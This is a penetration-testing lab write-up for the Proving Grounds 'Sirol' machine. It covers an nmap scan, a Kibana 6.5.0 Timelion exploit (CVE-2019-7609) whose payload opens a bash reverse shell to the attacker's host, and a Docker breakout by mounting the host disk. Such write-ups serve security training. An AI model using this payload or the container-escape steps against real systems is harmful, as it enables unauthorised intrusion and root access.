---
description: Proving Grounds PG Practice Sirol writeup
---

# Sirol

## Nmap

```
sudo nmap 192.168.64.54 -p- -sS -sV

PORT      STATE  SERVICE   VERSION
22/tcp    open   ssh       OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
53/tcp    closed domain
80/tcp    open   http      Apache httpd 2.4.25 ((Debian))
3306/tcp  open   mysql     MariaDB (unauthorized)
5601/tcp  open   esmagent?
24007/tcp open   rpcbind
```

Port 5601 is hosting Kibana. Looking through the management option on the left shows we are running version 6.5.0.

![http://192.168.64.54:5601/app/kibana#/management?\_g=()](<../../../.gitbook/assets/image (866) (1).png>)

Researching vulnerabilities on Google regarding this version takes us to a RCE exploit abusing the Timelion feature.

{% embed url="https://github.com/mpgn/CVE-2019-7609" %}

From here I used the second payload shown on the GitHub and pasted this into Timelion to point back to my IP and port 5601.

```bash
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/<IP>/5601 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

{% hint style="info" %}
If you are unable to get code execution reset the machine and try again in a incognito browser window.
{% endhint %}

![](<../../../.gitbook/assets/image (867).png>)

From here and as per the GitHub instructions hit the run button and then set up a `netcat` listener to the specified port.

After then browsing to the 'Canvas' page we should receive a root shell back on our listener.

![](<../../../.gitbook/assets/image (868).png>)

Listing everything inside the '/' directory shows a .dockerenv file. This combined with the hostname of 0873e8062560 means we are likely running inside a docker container.

![](<../../../.gitbook/assets/image (869).png>)

Using the command `fdisk -l` we can list the hosts disks.

![](<../../../.gitbook/assets/image (870).png>)

We can then create a directory and attempt to mount **/dev/sda1** to it so we can see if we can browse the hosts file system.

```bash
mkdir /mnt/own
mount /dev/sda1 /mnt/own
cd /mnt/own
```

![](<../../../.gitbook/assets/image (871).png>)

## References:

* [https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout)
* [https://github.com/mpgn/CVE-2019-7609](https://github.com/mpgn/CVE-2019-7609)
